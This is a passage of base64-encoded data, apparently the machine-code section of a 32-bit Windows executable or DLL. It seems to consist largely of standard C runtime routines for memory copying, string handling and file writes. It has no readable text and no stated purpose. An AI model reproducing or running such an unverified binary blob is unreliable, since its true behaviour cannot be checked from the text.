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X//1GLjSTl//9QjUX0UIuFKOX//4sEhSARAhD/NAH/FeAxARCFwA+ETAEAAIu1QOX//4uNROX//wPxi4U85f//OYU45f//D4xJAgAAOb0Y5f//dEuLjSTl//+NhTjl//9qAFBqAY1F9MZF9A1Qi4Uo5f//iwSFIBECEP80Af8V4DEBEIXAD4TtAAAAg7045f//AQ+M9wEAAP+FROX//0aLjTTl///phgAAAID7AXQFgPsCdTMPtwgz0mY7jRTl//+JjTTl//8PlMKDwAKJlTzl//+LlUDl//+DwgKJhSzl//+JlUDl//+A+wF0BYD7AnVLUeiwCgAAWYuNNOX//2Y7wXV1g8YCOb085f//dCJqDVhQiYU05f//6IoKAABZi4005f//ZjvBdU9G/4VE5f//i5VA5f//i4Us5f//O1UQD4Kp/f//6UUBAACLnSjl//9GigKLlSTl//+LDJ0gEQIQiEQKNIsEnSARAhDHRAI4AQAAAOkXAQAA/xWkMQEQi/jpCgEAAIuFKOX//4sMhSARAhCLhSTl///2RAgEgA+EdQMAAIuVMOX//zP/ib005f//hNsPhQ4BAACLXRCJlTjl//+F2w+EjQMAADPJjb306///i8KJjTzl//8rhTDl//87w3NEigpCQIiNH+X//4D5ComVOOX//4uNPOX//3UL/4VE5f//xgcNR0GKlR/l//+IF0eLlTjl//9BiY085f//gfn/EwAAcriLjSTl//+NhfTr//8r+I2FIOX//2oAUFeNhfTr//9Qi4Uo5f//iwSFIBECEP80Af8V4DEBEIXAD4QT////A7Ug5f//Ob0g5f//fBaLlTjl//+LwiuFMOX//zvDD4JB////i7005f//i41E5f//hfYPhfUCAACF/w+ErAIAAGoFWzv7D4WYAgAA6ArX///HAAkAAADoy9b//4kY6cYCAACLyoD7Ag+F6gAAADl1EA+GfAIAAMeFFOX//woAAACDpRjl//8AjZ306///i8FqDSvCi5UY5f//XjtFEHMzD7c5g8ACg8ECZju9FOX//3UQg4VE5f//AmaJM4PDAoPCAmaJO4PCAoPDAoH6/hMAAHLIjYX06///iY085f//i40k5f//K9hqAI2FIOX//1BTjYX06///UIuFKOX//4sEhSARAhD/NAH/FeAxARCLtUDl//+LvTTl//+FwA+E8v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